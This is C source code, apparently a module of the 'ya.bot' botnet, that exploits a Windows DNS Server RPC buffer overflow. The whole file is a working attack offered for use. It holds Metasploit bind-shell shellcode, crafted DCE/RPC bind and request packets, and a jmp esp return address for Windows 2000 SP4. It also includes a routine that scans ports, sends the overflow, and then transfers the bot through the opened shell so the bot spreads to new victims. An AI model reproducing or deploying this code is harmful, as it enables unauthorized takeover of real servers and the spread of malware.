/*  ya.bot  */

#include "..\..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANWDNS

/*#include <iostream>
#include <windows.h>

#pragma comment( lib, "ws2_32" )*/

/* win32_bind -  EXITFUNC=thread LPORT=4444 Size=342 Encoder=PexFnstenvMov
http://metasploit.com */
unsigned char uszShellcode[] =
/*       "\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x76\xd2\xab"
       "\x1f\x83\xeb\xfc\xe2\xf4\x8a\xb8\x40\x52\x9e\x2b\x54\xe0\x89\xb2"
       "\x20\x73\x52\xf6\x20\x5a\x4a\x59\xd7\x1a\x0e\xd3\x44\x94\x39\xca"
       "\x20\x40\x56\xd3\x40\x56\xfd\xe6\x20\x1e\x98\xe3\x6b\x86\xda\x56"
       "\x6b\x6b\x71\x13\x61\x12\x77\x10\x40\xeb\x4d\x86\x8f\x37\x03\x37"
       "\x20\x40\x52\xd3\x40\x79\xfd\xde\xe0\x94\x29\xce\xaa\xf4\x75\xfe"
       "\x20\x96\x1a\xf6\xb7\x7e\xb5\xe3\x70\x7b\xfd\x91\x9b\x94\x36\xde"
       "\x20\x6f\x6a\x7f\x20\x5f\x7e\x8c\xc3\x91\x38\xdc\x47\x4f\x89\x04"
       "\xcd\x4c\x10\xba\x98\x2d\x1e\xa5\xd8\x2d\x29\x86\x54\xcf\x1e\x19"
       "\x46\xe3\x4d\x82\x54\xc9\x29\x5b\x4e\x79\xf7\x3f\xa3\x1d\x23\xb8"
       "\xa9\xe0\xa6\xba\x72\x16\x83\x7f\xfc\xe0\xa0\x81\xf8\x4c\x25\x81"
       "\xe8\x4c\x35\x81\x54\xcf\x10\xba\xba\x43\x10\x81\x22\xfe\xe3\xba"
       "\x0f\x05\x06\x15\xfc\xe0\xa0\xb8\xbb\x4e\x23\x2d\x7b\x77\xd2\x7f"
       "\x85\xf6\x21\x2d\x7d\x4c\x23\x2d\x7b\x77\x93\x9b\x2d\x56\x21\x2d"
       "\x7d\x4f\x22\x86\xfe\xe0\xa6\x41\xc3\xf8\x0f\x14\xd2\x48\x89\x04"
       "\xfe\xe0\xa6\xb4\xc1\x7b\x10\xba\xc8\x72\xff\x37\xc1\x4f\x2f\xfb"
       "\x67\x96\x91\xb8\xef\x96\x94\xe3\x6b\xec\xdc\x2c\xe9\x32\x88\x90"
       "\x87\x8c\xfb\xa8\x93\xb4\xdd\x79\xc3\x6d\x88\x61\xbd\xe0\x03\x96"
       "\x54\xc9\x2d\x85\xf9\x4e\x27\x83\xc1\x1e\x27\x83\xfe\x4e\x89\x02"
       "\xc3\xb2\xaf\xd7\x65\x4c\x89\x04\xc1\xe0\x89\xe5\x54\xcf\xfd\x85"
       "\x57\x9c\xb2\xb6\x54\xc9\x24\x2d\x7b\x77\x99\x1c\x4b\x7f\x25\x2d"
       "\x7d\xe0\xa6\xd2\xab\x1f\x00";*/
/* win32_bind -  EXITFUNC=thread LPORT=8555 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x0a\xd7\x56"
"\xa6\x83\xeb\xfc\xe2\xf4\xf6\xbd\xbd\xeb\xe2\x2e\xa9\x59\xf5\xb7"
"\xdd\xca\x2e\xf3\xdd\xe3\x36\x5c\x2a\xa3\x72\xd6\xb9\x2d\x45\xcf"
"\xdd\xf9\x2a\xd6\xbd\xef\x81\xe3\xdd\xa7\xe4\xe6\x96\x3f\xa6\x53"
"\x96\xd2\x0d\x16\x9c\xab\x0b\x15\xbd\x52\x31\x83\x72\x8e\x7f\x32"
"\xdd\xf9\x2e\xd6\xbd\xc0\x81\xdb\x1d\x2d\x55\xcb\x57\x4d\x09\xfb"
"\xdd\x2f\x66\xf3\x4a\xc7\xc9\xe6\x8d\xc2\x81\x94\x66\x2d\x4a\xdb"
"\xdd\xd6\x16\x7a\xdd\xe6\x02\x89\x3e\x28\x44\xd9\xba\xf6\xf5\x01"
"\x30\xf5\x6c\xbf\x65\x94\x62\xa0\x25\x94\x55\x83\xa9\x76\x62\x1c"
"\xbb\x5a\x31\x87\xa9\x70\x55\x5e\xb3\xc0\x8b\x3a\x5e\xa4\x5f\xbd"
"\x54\x59\xda\xbf\x8f\xaf\xff\x7a\x01\x59\xdc\x84\x05\xf5\x59\x84"
"\x15\xf5\x49\x84\xa9\x76\x6c\xbf\x77\xcd\x6c\x84\xdf\x47\x9f\xbf"
"\xf2\xbc\x7a\x10\x01\x59\xdc\xbd\x46\xf7\x5f\x28\x86\xce\xae\x7a"
"\x78\x4f\x5d\x28\x80\xf5\x5f\x28\x86\xce\xef\x9e\xd0\xef\x5d\x28"
"\x80\xf6\x5e\x83\x03\x59\xda\x44\x3e\x41\x73\x11\x2f\xf1\xf5\x01"
"\x03\x59\xda\xb1\x3c\xc2\x6c\xbf\x35\xcb\x83\x32\x3c\xf6\x53\xfe"
"\x9a\x2f\xed\xbd\x12\x2f\xe8\xe6\x96\x55\xa0\x29\x14\x8b\xf4\x95"
"\x7a\x35\x87\xad\x6e\x0d\xa1\x7c\x3e\xd4\xf4\x64\x40\x59\x7f\x93"
"\xa9\x70\x51\x80\x04\xf7\x5b\x86\x3c\xa7\x5b\x86\x03\xf7\xf5\x07"
"\x3e\x0b\xd3\xd2\x98\xf5\xf5\x01\x3c\x59\xf5\xe0\xa9\x76\x81\x80"
"\xaa\x25\xce\xb3\xa9\x70\x58\x28\x86\xce\xe5\x19\xb6\xc6\x59\x28"
"\x80\x59\xda\xd7\x56\xa6";

/* 50abc2a4-574d-40b3-9d66-ee4fd5fba076 v5.0 */
unsigned char uszDceBind[] =
       "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
       "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
       "\xA4\xC2\xAB\x50\x4D\x57\xB3\x40\x9D\x66\xEE\x4F\xD5\xFB\xA0\x76"
       "\x05\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
       "\x2B\x10\x48\x60\x02\x00\x00\x00";

/* DnssrvQuery: opnum 1 */
unsigned char uszDceCall[] =
       "\x05\x00\x00\x83\x10\x00\x00\x00\x7f\x06\x00\x00\x01\x00\x00\x00"
       "\x57\x06\x00\x00\x00\x00\x01\x00\xa4\xc2\xab\x50\x4d\x57\xb3\x40"
       "\x9d\x66\xee\x4f\xd5\xfb\xa0\x76\x10\xc2\x40\x00\x02\x00\x00\x00"
       "\x00\x00\x00\x00\x02\x00\x00\x00\x44\x00\x00\x00\x94\xfa\x13\x00"
       "\xcc\x04\x00\x00\x00\x00\x00\x00\xcc\x04\x00\x00";

unsigned char uszDceEnd1[] =
       "\x41\x00\xb8\xc0\x40\x00\x57\x01\x00\x00\x00\x00\x00\x00\x57\x01"
       "\x00\x00";

unsigned char uszJmps[] =
       /* 0x77E14C29 - jmp esp user32.dll (Windows 2000 Advanced Server SP4) */
       "\x5C\x29\x5C\x4C\x5C\xE1\x5C\x77"

       /* inc edx, jmp edx */
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42"
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42"
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42"
       "\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42\x5C\x42"
       "\x5C\x42\x5C\xFF\x5C\xE2";

SOCKET IsPortOpen(char *szIP, int nPort)
{
	FD_SET fdset;
	int i;
	SOCKET sock;
	SOCKADDR_IN sin;
	TIMEVAL timeout;
	unsigned long block = 0, unblock = 1;
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) 
			return FALSE;
		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(szIP);
		sin.sin_port = htons(nPort);
		ioctlsocket(sock, FIONBIO, &unblock);
		connect(sock, (SOCKADDR *)&sin, sizeof(sin));
		timeout.tv_sec = 0;
		timeout.tv_usec = 500;
		FD_ZERO(&fdset);
		FD_SET(sock, &fdset);
		i = select(0, 0, &fdset, 0, &timeout);
	if (i <= 0)
	{
			closesocket(sock);
			return NULL;
	}
	else
	{
			ioctlsocket(sock, FIONBIO, &block);
			return sock;
	}
}

//int main( int argc, char **argv ) {
bool wdns(SExpScanInfo s_esi)
{
//       WSADATA wsaData;
       SOCKET sConnect = NULL;
       SOCKADDR_IN sockAddr;
       char szRecvBuf[4096];
       unsigned char uszPacket[1663];
       int nRet;

#ifndef NO_DEBUG
		debug_print("Exploit scanning WDNS, expscan_wdns()");
#endif

closesocket(s_esi.m_csock);
int i;
for (i = 1024; i < 5000; i++) // zzz
{
		closesocket(sConnect);
		sConnect = IsPortOpen(s_esi.m_szIP, i);
	if (sConnect)
	{
		closesocket(sConnect);

#ifndef NO_DEBUG
debug_print("[WDNS] testing port: %i (%s)", i, s_esi.m_szIP);
#endif

/*      if ( argc < 3 ) {
               usage( );
               return -1;
       }

       if ( WSAStartup( MAKEWORD( 2, 0 ), &wsaData ) != NO_ERROR ) {
//               printf("[-] Unable to startup winsock\n");
               return -1;
       }*/

       sConnect = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
       if ( sConnect == INVALID_SOCKET ) {
//               printf("[-] Invalid socket\n");
               return FALSE;
       }

       sockAddr.sin_family = AF_INET;
       sockAddr.sin_addr.s_addr = inet_addr( s_esi.m_szIP );
       sockAddr.sin_port = htons( i );

//       printf("[+] Connecting to %s:%s\n", argv[1], argv[2] );
       nRet = connect( sConnect, (SOCKADDR *)&sockAddr, sizeof( sockAddr ) );
       if ( nRet == SOCKET_ERROR ) {
               closesocket( sConnect );
//               printf("[-] Cannot connect to server\n");
               return FALSE;
       }
//       sConnect = s_esi.m_csock;

//       printf("[+] Sending DCE Bind packet...\n");
       nRet = send( sConnect, (const char *)uszDceBind, sizeof( uszDceBind ) - 1, 0 );
       if ( nRet  == SOCKET_ERROR ) {
               closesocket( sConnect );
//               printf("[-] Cannot send\n");
               return FALSE;
       }

       nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );
       if ( nRet <= 0 ) {
               closesocket( sConnect );
//               printf("[-] Recv failed\n");
               return FALSE;
       }

       memset( uszPacket, 0x5C, sizeof( uszPacket ) );
       memcpy( uszPacket, uszDceCall, sizeof( uszDceCall ) - 1 );
       memcpy( uszPacket + 1006, uszJmps, sizeof( uszJmps ) - 1 );
       memcpy( uszPacket + 1302, uszDceEnd1, sizeof( uszDceEnd1 ) );
       memcpy( uszPacket + 1320, uszShellcode, sizeof( uszShellcode ) );

//       printf("[+] Sending DCE Request packet...\n");
       nRet = send( sConnect, (const char *)uszPacket, sizeof( uszPacket ), 0 );
       if ( nRet == SOCKET_ERROR ) {
               closesocket( sConnect );
//               printf("[-] Cannot send\n");
               return FALSE;
       }

//       printf("[+] Check shell on port 4444 :)\n");

#ifndef NO_DAEMONFTP
	if (transfer_shelltransfer(s_esi.m_bsock, s_esi.m_szIP, 8555))
	{

#ifndef NO_DEBUG
debug_print("[WDNS] !BINGO! DNS port: %i (%s)", i, s_esi.m_szIP);
#endif

		    nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );
			closesocket( sConnect );
			return TRUE;
	}
#endif

       nRet = recv( sConnect, szRecvBuf, sizeof( szRecvBuf ), 0 );
       closesocket( sConnect );

	}
}
return FALSE;

}

// milw0rm.com [2007-04-15]
#endif
#endif